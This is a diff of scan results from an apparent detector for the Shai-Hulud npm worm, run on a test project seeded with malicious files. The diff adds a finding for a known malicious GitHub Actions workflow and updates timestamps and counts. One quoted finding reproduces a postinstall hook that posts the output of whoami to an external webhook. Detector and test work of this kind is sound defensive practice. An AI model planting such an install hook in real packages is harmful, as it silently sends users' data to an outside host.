@@ -1,9 +1,9 @@
 {
   "scan_path": "../shai-hulud-detect/test-cases/infected-project/",
-  "start_time": "2025-09-28T08:08:06.044606Z",
-  "end_time": "2025-09-28T08:08:06.121553300Z",
-  "duration_seconds": 0.076,
-  "timestamp": "2025-09-28T08:08:06.044606Z",
+  "start_time": "2025-09-28T08:18:50.196002800Z",
+  "end_time": "2025-09-28T08:18:50.262279900Z",
+  "duration_seconds": 0.066,
+  "timestamp": "2025-09-28T08:18:50.196002800Z",
   "files_scanned": 0,
   "results": [
     {
@@ -130,6 +130,19 @@
       ]
     },
     {
+      "file": "../shai-hulud-detect/test-cases/infected-project/.github\\workflows\\shai-hulud-workflow.yml",
+      "risk_level": "High",
+      "comment": "Malicious workflow file detected: Known malicious workflow filename",
+      "patterns_detected": [
+        "malicious_workflow_file"
+      ],
+      "details": [
+        "shai-hulud-workflow.yml is a known malicious GitHub Actions workflow",
+        "This file was used in the September 8, 2025 chalk/debug attack",
+        "Remove this file immediately and check repository history"
+      ]
+    },
+    {
       "file": "../shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json",
       "risk_level": "High",
       "comment": "Suspicious postinstall hook detected: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)",
@@ -167,9 +180,9 @@
     }
   ],
   "summary": {
-    "high_risk_count": 9,
+    "high_risk_count": 10,
     "medium_risk_count": 2,
     "low_risk_count": 0,
-    "total_issues": 11
+    "total_issues": 12
   }
 }
